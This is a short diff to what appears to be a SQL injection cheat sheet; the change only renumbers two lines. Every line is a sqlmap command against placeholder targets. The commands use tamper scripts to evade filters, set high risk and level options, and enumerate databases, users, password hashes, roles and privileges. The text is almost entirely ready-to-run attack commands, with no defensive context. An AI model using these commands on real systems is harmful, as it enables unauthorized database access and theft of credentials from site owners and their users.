@@ -16,8 +16,8 @@
 14. python3 sqlmap.py -r request.txt -t 10 --tamper="between,randomcase,space2comment" --random-agent --dbs --level=5 --risk=3 --threads=5 --hex --data="id=2618 AND 2323=2323" --dbms=Oracle
 
 // others
-python sqlmap.py -u "http://yoursite.com/news.php?id=1" --dbs --current-user --current-db --is-dba --users --passwords --roles --hostname --privileges
-python sqlmap.py -u "https://target.com/?id=1" -t 10 --tamper="between,randomcase,space2comment" --dbs --random-agent --risk=3 --level=5
+1. python sqlmap.py -u "http://yoursite.com/news.php?id=1" --dbs --current-user --current-db --is-dba --users --passwords --roles --hostname --privileges
+2. python sqlmap.py -u "https://target.com/?id=1" -t 10 --tamper="between,randomcase,space2comment" --dbs --random-agent --risk=3 --level=5
 
 // set parameter target
 sqlmap -r ./target.txt --tamper="between,randomcase,space2comment" --random-agent -p username,password
